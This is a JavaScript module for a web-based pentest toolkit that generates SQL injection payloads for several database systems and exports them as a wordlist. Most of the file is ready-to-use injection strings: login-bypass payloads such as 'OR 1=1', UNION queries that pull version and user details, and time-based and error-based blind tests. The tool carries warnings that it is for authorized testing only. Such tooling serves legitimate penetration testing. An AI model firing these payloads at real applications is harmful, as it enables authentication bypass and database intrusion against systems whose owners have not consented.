// ========================================
// SQL INJECTION HELPER
// Category: Purple Team
// ========================================

(function () {
    'use strict';

    function render() {
        return `

        <div class="section-header">
                <h3 class="mb-1 d-flex align-items-center gap-2">
                    <i class="bi bi-database-fill-exclamation"></i>
                    <span>SQL Injection Helper</span>
                </h3>
                <p class="text-secondary mb-0">
                  Generate SQL injection proof-of-concept and fingerprinting payloads for different DBMS.
                Use only in authorized penetration tests.
                </p>
            </div>

        <div class="alert alert-warning">
            <i class="bi bi-exclamation-triangle-fill"></i>
            <strong>Warning:</strong>
            These payloads are for detection and basic fingerprinting only. 
            Do not use them against systems without explicit permission.
        </div>

        <div class="mb-3">
            <label class="form-label">Target DBMS</label>
            <div class="row">
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbGeneric" checked>
                        <label class="form-check-label" for="dbGeneric">Generic / Unknown</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbMySQL" >
                        <label class="form-check-label" for="dbMySQL">MySQL / MariaDB</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbPostgres" >
                        <label class="form-check-label" for="dbPostgres">PostgreSQL</label>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbMSSQL" >
                        <label class="form-check-label" for="dbMSSQL">Microsoft SQL Server</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbOracle" >
                        <label class="form-check-label" for="dbOracle">Oracle</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="dbSQLite" >
                        <label class="form-check-label" for="dbSQLite">SQLite</label>
                    </div>
                </div>
            </div>
            <small class="text-secondary">
                Select one or more DBMS you suspect on the backend. If unsure, check everything.
            </small>
        </div>

        <div class="mb-3">
            <label class="form-label">Technique categories</label>
            <div class="row">
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="techAuth" checked>
                        <label class="form-check-label" for="techAuth">Auth bypass / logic bypass</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="techBoolean" checked>
                        <label class="form-check-label" for="techBoolean">Boolean-based tests</label>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="techUnion" checked>
                        <label class="form-check-label" for="techUnion">UNION-based templates</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="techTime" checked>
                        <label class="form-check-label" for="techTime">Time-based tests</label>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="techError" checked>
                        <label class="form-check-label" for="techError">Error-based tests</label>
                    </div>
                </div>
            </div>
            <small class="text-secondary">
                These are generic testing primitives. You still need to adapt them to the specific parameter/context.
            </small>
        </div>

<button class="btn btn-success" id="sqliGenerateBtn">
    <i class="bi bi-hammer"></i> Generate payloads
</button>

<button class="btn btn-outline-info ms-2 d-none" id="sqliCopyAllBtn">
    <i class="bi bi-clipboard"></i> Copy all
</button>

<button class="btn btn-outline-warning ms-2 d-none" id="sqliDownloadBtn">
    <i class="bi bi-download"></i> Download wordlist
</button>

<div id="sqliResults" class="mt-4"></div>
    `;
    }

    function init() {
        let currentPayloads = [];

        function generatePayloads() {
            const resultsDiv = document.getElementById('sqliResults');
            const copyAllBtn = document.getElementById('sqliCopyAllBtn');
const downloadBtn = document.getElementById('sqliDownloadBtn');

            const dbs = {
                generic: document.getElementById('dbGeneric').checked,
                mysql: document.getElementById('dbMySQL').checked,
                postgres: document.getElementById('dbPostgres').checked,
                mssql: document.getElementById('dbMSSQL').checked,
                oracle: document.getElementById('dbOracle').checked,
                sqlite: document.getElementById('dbSQLite').checked
            };

            const tech = {
                auth: document.getElementById('techAuth').checked,
                boolean: document.getElementById('techBoolean').checked,
                union: document.getElementById('techUnion').checked,
                time: document.getElementById('techTime').checked,
                error: document.getElementById('techError').checked
            };

if (!Object.values(dbs).some(Boolean)) {
    resultsDiv.innerHTML = `
        <div class="alert alert-warning">
            <i class="bi bi-exclamation-circle-fill"></i>
            Please select at least one DBMS.
        </div>
    `;
    currentPayloads = [];
    copyAllBtn.classList.add('d-none');
    downloadBtn.classList.add('d-none');
    return;
}

if (!Object.values(tech).some(Boolean)) {
    resultsDiv.innerHTML = `
        <div class="alert alert-warning">
            <i class="bi bi-exclamation-circle-fill"></i>
            Please select at least one technique category.
        </div>
    `;
    currentPayloads = [];
    copyAllBtn.classList.add('d-none');
    downloadBtn.classList.add('d-none');
    return;
}



            if (!Object.values(tech).some(Boolean)) {
                resultsDiv.innerHTML = `
                    <div class="alert alert-warning">
                        <i class="bi bi-exclamation-circle-fill"></i>
                        Please select at least one technique category.
                    </div>
                `;
                currentPayloads = [];
                return;
            }

            const payloads = [];

            // ========== GENERIC / UNKNOWN DBMS ==========
            if (dbs.generic) {
                if (tech.auth) {
                    payloads.push({
                        category: 'Generic – Auth / Logic Bypass',
                        hint: 'Classic login bypass payloads for string / numeric parameters.',
                        items: [
                            // String-based
                            `' OR '1'='1'-- -`,
                            `' OR '1'='1'#`,
                            `' OR '1'='1'/*`,
                            `' OR 1=1-- -`,
                            `' OR 1=1#`,
                            `' OR 1=1/*`,
                            `') OR ('1'='1'-- -`,
                            `') OR '1'='1'-- -`,
                            `admin'-- -`,
                            `admin' #`,
                            `admin'/*`,
                            `admin' OR '1'='1'-- -`,
                            // Numeric-based
                            `1 OR 1=1`,
                            `1 OR 1=1-- -`,
                            `1 OR 1=1#`,
                            `1 OR 1=1/*`,
                            // Null / empty
                            `' OR ''=''-- -`,
                            `' OR ''=''#`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'Generic – Boolean-based Tests',
                        hint: 'Compare responses between always-true and always-false statements.',
                        items: [
                            `' AND 1=1-- -`,
                            `' AND 1=2-- -`,
                            `' AND '1'='1'-- -`,
                            `' AND '1'='2'-- -`,
                            `' AND 2>1-- -`,
                            `' AND 2<1-- -`,
                            `") AND 1=1-- -`,
                            `") AND 1=2-- -`,
                            `1 AND 1=1-- -`,
                            `1 AND 1=2-- -`,
                            `1 AND 2>1-- -`,
                            `1 AND 2<1-- -`,
                            // Parenthesis variations
                            `') AND (1=1)-- -`,
                            `') AND (1=2)-- -`,
                            // Boolean explicit
                            `' AND TRUE-- -`,
                            `' AND FALSE-- -`
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'Generic – UNION-based Templates',
                        hint: 'Adjust number of NULLs to match column count; then swap NULL with test expressions.',
                        items: [
                            `' UNION SELECT NULL-- -`,
                            `' UNION SELECT NULL,NULL-- -`,
                            `' UNION SELECT NULL,NULL,NULL-- -`,
                            `' UNION SELECT NULL,NULL,NULL,NULL-- -`,
                            `' UNION ALL SELECT NULL-- -`,
                            `' UNION ALL SELECT NULL,NULL-- -`,
                            `' UNION ALL SELECT NULL,NULL,NULL-- -`,
                            `' UNION ALL SELECT NULL,NULL,NULL,NULL-- -`,
                            // Column count detection (ORDER BY)
                            `' ORDER BY 1-- -`,
                            `' ORDER BY 2-- -`,
                            `' ORDER BY 3-- -`,
                            `' ORDER BY 4-- -`,
                            `' ORDER BY 5-- -`,
                            `' ORDER BY 10-- -`,
                            // UNION + comment style variations
                            `' UNION ALL SELECT NULL-- #`,
                            `' UNION ALL SELECT NULL,NULL-- #`
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'Generic – Time-based Ideas',
                        hint: 'Mix of DB-specific hints; use to see if time delays are reflected in responses.',
                        items: [
                            `' AND SLEEP(5)-- -         -- MySQL-like`,
                            `' OR SLEEP(5)-- -`,
                            `' AND pg_sleep(5)-- -      -- PostgreSQL-like`,
                            `' OR pg_sleep(5)-- -`,
                            `' WAITFOR DELAY '0:0:5'--   -- SQL Server stacked (if supported)`,
                            `'; WAITFOR DELAY '0:0:5';--`,
                            `' AND 1=CASE WHEN (1=1) THEN 1 ELSE 1/0 END-- -`,
                            `' AND 1=CASE WHEN (1=2) THEN 1 ELSE 1/0 END-- -`
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'Generic – Error-based Tests',
                        hint: 'Force the DB to throw an error and look for stack traces / SQL error banners.',
                        items: [
                            `' AND 1=1/0-- -`,
                            `' AND (SELECT 1/0)-- -`,
                            `' AND CAST('abc' AS int)-- -`,
                            `' AND CAST('abc' AS numeric)-- -`,
                            `' AND 1=(SELECT 1/0)-- -`,
                            `' AND (SELECT 1/0 FROM dual)-- -  -- some DBs'`,
                            `' AND (SELECT @@version)-- -      -- may error or leak banner`,
                            `' AND (SELECT version())-- -      -- may error or leak banner`
                        ]
                    });
                }
            }

            // ========== MYSQL / MARIADB ==========
            if (dbs.mysql) {
                if (tech.auth) {
                    payloads.push({
                        category: 'MySQL / MariaDB – Auth / Logic Bypass',
                        hint: 'Use MySQL comment styles (#, -- , /*...*/).',
                        items: [
                            `' OR '1'='1'#`,
                            `' OR '1'='1'-- -`,
                            `' OR '1'='1'/*`,
                            `' OR 1=1#`,
                            `' OR 1=1-- -`,
                            `' OR 1=1/*`,
                            `') OR ('1'='1')#`,
                            `') OR ('1'='1')-- -`,
                            `admin' OR '1'='1'#`,
                            `admin' OR '1'='1'-- -`,
                            `admin' OR 1=1#`,
                            `admin' OR 1=1-- -`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'MySQL / MariaDB – Boolean-based Tests',
                        hint: 'Check content difference or error presence.',
                        items: [
                            `' AND 1=1#`,
                            `' AND 1=2#`,
                            `' AND '1'='1'#`,
                            `' AND '1'='2'#`,
                            `1 AND 1=1#`,
                            `1 AND 1=2#`,
                            `1 AND (SELECT 1)#`,
                            `1 AND (SELECT 1 FROM dual)#`,
                            // LIKE tests
                            `' AND 'a' LIKE 'a'#`,
                            `' AND 'a' LIKE 'b'#`
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'MySQL / MariaDB – UNION-based Templates',
                        hint: 'Use @@version, database(), user() to fingerprint.',
                        items: [
                            `' UNION SELECT @@version-- -`,
                            `' UNION SELECT database()-- -`,
                            `' UNION SELECT user()-- -`,
                            `' UNION ALL SELECT @@version, NULL-- -`,
                            `' UNION ALL SELECT NULL, database()-- -`,
                            `' UNION ALL SELECT user(), @@version-- -`,
                            `' UNION ALL SELECT NULL, user(), database()-- -`,
                            // With ORDER BY / LIMIT hints
                            `' UNION ALL SELECT NULL,NULL LIMIT 1-- -`,
                            `' UNION ALL SELECT NULL,@@version LIMIT 1-- -`
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'MySQL / MariaDB – Time-based Tests',
                        hint: 'Blind SQLi detection via SLEEP/IF.',
                        items: [
                            `' AND SLEEP(5)-- -`,
                            `' OR SLEEP(5)-- -`,
                            `1 AND SLEEP(5)-- -`,
                            `1 OR SLEEP(5)-- -`,
                            `' AND IF(1=1, SLEEP(5), 0)-- -`,
                            `' AND IF(1=2, SLEEP(5), 0)-- -`,
                            `' AND IF('a'='a', SLEEP(5), 0)-- -`,
                            `' AND IF('a'='b', SLEEP(5), 0)-- -`
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'MySQL / MariaDB – Error-based Tests',
                        hint: 'Error-based fingerprinting with division / XML functions.',
                        items: [
                            `' AND (SELECT 1/0)-- -`,
                            `' AND (SELECT 1/0 FROM dual)-- -`,
                            `' AND CAST('abc' AS UNSIGNED)-- -`,
                            `' AND EXTRACTVALUE(1, CONCAT(0x3a, @@version))-- -`,
                            `' AND UPDATEXML(1, CONCAT(0x3a, database()), 1)-- -`,
                            `' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 1)a GROUP BY 1/0)-- -`
                        ]
                    });
                }
            }

            // ========== POSTGRESQL ==========
            if (dbs.postgres) {
                if (tech.auth) {
                    payloads.push({
                        category: 'PostgreSQL – Auth / Logic Bypass',
                        hint: 'Uses -- comment style, similar to generic payloads.',
                        items: [
                            `' OR '1'='1'--`,
                            `' OR 1=1--`,
                            `') OR ('1'='1'--`,
                            `') OR '1'='1'--`,
                            `admin'--`,
                            `admin' OR '1'='1'--`,
                            // Numeric style
                            `1 OR 1=1--`,
                            `1 OR 1=1/*`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'PostgreSQL – Boolean-based Tests',
                        hint: 'Use subqueries and PostgreSQL-specific behavior.',
                        items: [
                            `' AND 1=(SELECT 1)--`,
                            `' AND 1=(SELECT 2)--`,
                            `' AND '1'='1'--`,
                            `' AND '1'='2'--`,
                            `1 AND 1=(SELECT 1)--`,
                            `1 AND 1=(SELECT 2)--`,
                            // Casting tests
                            `' AND 1=CAST('1' AS INTEGER)--`,
                            `' AND 1=CAST('2' AS INTEGER)--`
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'PostgreSQL – UNION-based Templates',
                        hint: 'Fingerprint using version(), current_database(), current_user.',
                        items: [
                            `' UNION SELECT version()--`,
                            `' UNION ALL SELECT current_database()--`,
                            `' UNION ALL SELECT current_user--`,
                            `' UNION ALL SELECT version(), current_database()--`,
                            `' UNION ALL SELECT NULL, version()--`,
                            `' UNION ALL SELECT NULL, current_database()--`
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'PostgreSQL – Time-based Tests',
                        hint: 'pg_sleep() is the classic primitive.',
                        items: [
                            `' AND 1=(SELECT 1 FROM pg_sleep(5))--`,
                            `' OR 1=(SELECT 1 FROM pg_sleep(5))--`,
                            `' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`,
                            `' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`,
                            `' AND EXISTS (SELECT pg_sleep(5))--`
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'PostgreSQL – Error-based Tests',
                        hint: 'Trigger divide-by-zero or casting errors.',
                        items: [
                            `' AND 1=(SELECT 1/0)--`,
                            `' AND (SELECT 1/0)::text IS NOT NULL--`,
                            `' AND CAST('abc' AS INTEGER)=1--`,
                            `' AND (SELECT 1/0 FROM generate_series(1,1))--`,
                            `' AND current_setting('server_version') IS NOT NULL--`
                        ]
                    });
                }
            }

            // ========== MICROSOFT SQL SERVER ==========
            if (dbs.mssql) {
                if (tech.auth) {
                    payloads.push({
                        category: 'SQL Server – Auth / Logic Bypass',
                        hint: 'Use -- or /* */ comments.',
                        items: [
                            `' OR '1'='1'--`,
                            `' OR 1=1--`,
                            `') OR ('1'='1')--`,
                            `admin'--`,
                            `admin' OR '1'='1'--`,
                            // Numeric
                            `1 OR 1=1--`,
                            `1 OR 1=1/*`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'SQL Server – Boolean-based Tests',
                        hint: 'Classic 1=1 vs 1=2 difference.',
                        items: [
                            `' AND 1=1--`,
                            `' AND 1=2--`,
                            `' AND '1'='1'--`,
                            `' AND '1'='2'--`,
                            `1 AND 1=1--`,
                            `1 AND 1=2--`,
                            `' AND 2>1--`,
                            `' AND 2<1--`
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'SQL Server – UNION-based Templates',
                        hint: 'Use @@version and DB_NAME() for fingerprinting.',
                        items: [
                            `' UNION SELECT @@version--`,
                            `' UNION SELECT DB_NAME()--`,
                            `' UNION ALL SELECT @@version, DB_NAME()--`,
                            `' UNION ALL SELECT NULL, @@version--`,
                            `' UNION ALL SELECT NULL, DB_NAME()--`
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'SQL Server – Time-based Tests',
                        hint: 'WAITFOR DELAY requires stacked queries / batch separation.',
                        items: [
                            `'; WAITFOR DELAY '0:0:5';--`,
                            `'; IF (1=1) WAITFOR DELAY '0:0:5';--`,
                            `'; IF (1=2) WAITFOR DELAY '0:0:5';--`,
                            `' WAITFOR DELAY '0:0:5'--`
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'SQL Server – Error-based Tests',
                        hint: 'Force arithmetic or conversion errors.',
                        items: [
                            `' AND 1/0=1--`,
                            `' AND CONVERT(int, 'abc')=1--`,
                            `' AND (SELECT 1/0)--`,
                            `' AND @@version LIKE '%Microsoft SQL Server%'--`,
                            `' AND CAST('abc' AS int)=1--`
                        ]
                    });
                }
            }

            // ========== ORACLE ==========
            if (dbs.oracle) {
                if (tech.auth) {
                    payloads.push({
                        category: 'Oracle – Auth / Logic Bypass',
                        hint: 'Remember Oracle\'s "-- " (space after comment).',
                        items: [
                            `' OR '1'='1'-- `,
                            `' OR 1=1-- `,
                            `') OR ('1'='1')-- `,
                            `admin'-- `,
                            `admin' OR '1'='1'-- `,
                            // numeric
                            `1 OR 1=1-- `,
                            `1 OR 1=1/*`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'Oracle – Boolean-based Tests',
                        hint: 'Use DUAL / ROWNUM for behavior checks.',
                        items: [
                            `' AND 1=1-- `,
                            `' AND 1=2-- `,
                            `' AND '1'='1'-- `,
                            `' AND '1'='2'-- `,
                            `' AND 1=(SELECT 1 FROM dual)-- `,
                            `' AND 1=(SELECT 2 FROM dual)-- `,
                            `' AND 1=(SELECT 1 FROM dual WHERE ROWNUM=1)-- `,
                            `' AND 1=(SELECT 2 FROM dual WHERE ROWNUM=1)-- `
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'Oracle – UNION-based Templates',
                        hint: 'Use v$version banner rows for fingerprinting.',
                        items: [
                            `' UNION SELECT banner FROM v$version-- `,
                            `' UNION ALL SELECT NULL, banner FROM v$version-- `,
                            `' UNION ALL SELECT banner, NULL FROM v$version-- `,
                            `' UNION ALL SELECT banner FROM v$version WHERE ROWNUM=1-- `
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'Oracle – Time-based Tests',
                        hint: 'dbms_pipe.receive_message / dbms_lock.sleep (if permissions allow).',
                        items: [
                            `' AND 1=1 AND dbms_pipe.receive_message('X',5)=1-- `,
                            `' AND 1=2 AND dbms_pipe.receive_message('X',5)=1-- `,
                            `' AND CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 0 END IS NULL-- `,
                            `' AND CASE WHEN (1=2) THEN dbms_lock.sleep(5) ELSE 0 END IS NULL-- `
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'Oracle – Error-based Tests',
                        hint: 'Look for ORA- error codes.',
                        items: [
                            `' AND 1=(SELECT TO_NUMBER('abc') FROM dual)-- `,
                            `' AND 1=(SELECT 1/0 FROM dual)-- `,
                            `' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL-- `,
                            `' AND 1=(SELECT TO_NUMBER('9999999999999999999999999') FROM dual)-- `
                        ]
                    });
                }
            }

            // ========== SQLITE ==========
            if (dbs.sqlite) {
                if (tech.auth) {
                    payloads.push({
                        category: 'SQLite – Auth / Logic Bypass',
                        hint: 'Many generic patterns apply similarly.',
                        items: [
                            `' OR '1'='1'--`,
                            `' OR 1=1--`,
                            `') OR ('1'='1')--`,
                            `admin'--`,
                            `admin' OR '1'='1'--`,
                            // numeric
                            `1 OR 1=1--`,
                            `1 OR 1=1/*`
                        ]
                    });
                }

                if (tech.boolean) {
                    payloads.push({
                        category: 'SQLite – Boolean-based Tests',
                        hint: 'Basic boolean checks.',
                        items: [
                            `' AND 1=1--`,
                            `' AND 1=2--`,
                            `' AND '1'='1'--`,
                            `' AND '1'='2'--`,
                            `1 AND 1=1--`,
                            `1 AND 1=2--`
                        ]
                    });
                }

                if (tech.union) {
                    payloads.push({
                        category: 'SQLite – UNION-based Templates',
                        hint: 'Use sqlite_version() for banner fingerprint.',
                        items: [
                            `' UNION SELECT sqlite_version()--`,
                            `' UNION ALL SELECT NULL, sqlite_version()--`,
                            `' UNION ALL SELECT sqlite_version(), NULL--`
                        ]
                    });
                }

                if (tech.time) {
                    payloads.push({
                        category: 'SQLite – Time-based / Indirect Tests',
                        hint: 'No native sleep; rely on app-side behavior / heavy queries instead.',
                        items: [
                            `' AND 1=1--  -- Use complex queries or large operations as timing primitive`,
                            `' AND (SELECT COUNT(*) FROM sqlite_master)--`
                        ]
                    });
                }

                if (tech.error) {
                    payloads.push({
                        category: 'SQLite – Error-based Tests',
                        hint: 'Trigger division / cast errors and look for SQLite messages.',
                        items: [
                            `' AND 1/0=1--`,
                            `' AND CAST('abc' AS INTEGER)=1--`,
                            `' AND (SELECT sqlite_version()) IS NOT NULL--`
                        ]
                    });
                }
            }

            currentPayloads = payloads;

            if (!payloads.length) {
    resultsDiv.innerHTML = `
        <div class="alert alert-info">
            No payloads generated. Check your DBMS / technique selections.
        </div>
    `;
    copyAllBtn.classList.add('d-none');
    downloadBtn.classList.add('d-none');
    return;
}

            if (!payloads.length) {
                resultsDiv.innerHTML = `
                    <div class="alert alert-info">
                        No payloads generated. Check your DBMS / technique selections.
                    </div>
                `;
                return;
            }

            // -------- RENDER RESULTS --------
            let html = '<div class="accordion" id="sqliAccordion">';
            let totalPayloads = 0;

            payloads.forEach((category, idx) => {
                totalPayloads += category.items.length;
                const collapseId = `sqliCollapse${idx}`;
                const isFirst = idx === 0;

                html += `
                <div class="accordion-item" style="background-color: var(--terminal-card); border-color: var(--terminal-border);">
                    <h2 class="accordion-header">
                        <button class="accordion-button ${isFirst ? '' : 'collapsed'}" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}" style="background-color: rgba(0, 255, 136, 0.15); color: var(--terminal-accent); border-color: var(--terminal-accent);">
                            <i class="bi bi-folder-fill me-2"></i> ${category.category} (${category.items.length} payloads)
                        </button>
                    </h2>
                    <div id="${collapseId}" class="accordion-collapse collapse ${isFirst ? 'show' : ''}" data-bs-parent="#sqliAccordion">
                        <div class="accordion-body" style="background-color: var(--terminal-card);">
                            <p class="text-secondary small mb-3">${category.hint}</p>
                `;

                category.items.forEach(payload => {
                    html += `
                <div class="mb-2">
                        <div class="code-block position-relative" style="background-color: var(--terminal-surface); padding: 12px; border-radius: 6px; border: 1px solid var(--terminal-border);">
                            <code class="text-break" style="color: var(--terminal-accent);">${window.escapeHtml(payload)}</code>
                            <button class="btn btn-sm btn-outline-success position-absolute top-0 end-0 m-1 sqli-copy-payload-btn" data-payload-text="${window.escapeHtml(payload)}">
                                <i class="bi bi-clipboard"></i>
                            </button>
                        </div>
                    </div>
                `;
                });

                html += `
                        </div>
                    </div>
                </div>
                `;
            });

            html += '</div>';

            html = `
            <div class="alert alert-success mb-3">
                <i class="bi bi-check-circle-fill"></i> Generated <strong>${totalPayloads}</strong> SQL injection test payloads.
            </div>
            ` + html;

            copyAllBtn.classList.remove('d-none');
downloadBtn.classList.remove('d-none');

resultsDiv.innerHTML = html;

            // Copy single payload
            document.querySelectorAll('.sqli-copy-payload-btn').forEach(btn => {
                btn.addEventListener('click', function () {
                    const payload = this.getAttribute('data-payload-text');
                    const textarea = document.createElement('textarea');
                    textarea.value = payload;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);

                    const originalHtml = this.innerHTML;
                    this.innerHTML = '<i class="bi bi-check-fill"></i>';
                    this.classList.add('btn-success');
                    this.classList.remove('btn-outline-success');
                    setTimeout(() => {
                        this.innerHTML = originalHtml;
                        this.classList.remove('btn-success');
                        this.classList.add('btn-outline-success');
                    }, 2000);
                });
            });
        }

        function copyAllPayloads() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first.');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => allPayloads.push(payload));
            });

            const textarea = document.createElement('textarea');
            textarea.value = allPayloads.join('\n');
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);

            const btn = document.getElementById('sqliCopyAllBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Copied!';
            btn.classList.remove('btn-info');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-info');
            }, 2000);
        }

        function downloadWordlist() {
            if (currentPayloads.length === 0) {
                alert('Please generate payloads first.');
                return;
            }

            const allPayloads = [];
            currentPayloads.forEach(category => {
                category.items.forEach(payload => allPayloads.push(payload));
            });

            const content = allPayloads.join('\n');
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'sqli-payloads-wordlist.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            const btn = document.getElementById('sqliDownloadBtn');
            const originalHtml = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check-fill"></i> Downloaded!';
            btn.classList.remove('btn-warning');
            btn.classList.add('btn-success');
            setTimeout(() => {
                btn.innerHTML = originalHtml;
                btn.classList.remove('btn-success');
                btn.classList.add('btn-warning');
            }, 2000);
        }

        document.getElementById('sqliGenerateBtn').addEventListener('click', generatePayloads);
        document.getElementById('sqliCopyAllBtn').addEventListener('click', copyAllPayloads);
        document.getElementById('sqliDownloadBtn').addEventListener('click', downloadWordlist);
    }

    // Register the tool
    window.registerCyberSuiteTool({
        id: 'sql-injection-helper',
        name: 'SQLi Payloads Generator',
        description: 'Generate SQL injection PoC payloads for multiple DBMS during authorized security testing',
        icon: 'bi-database-fill-exclamation',
        category: 'red',
        render: render,
        init: init
    });
})();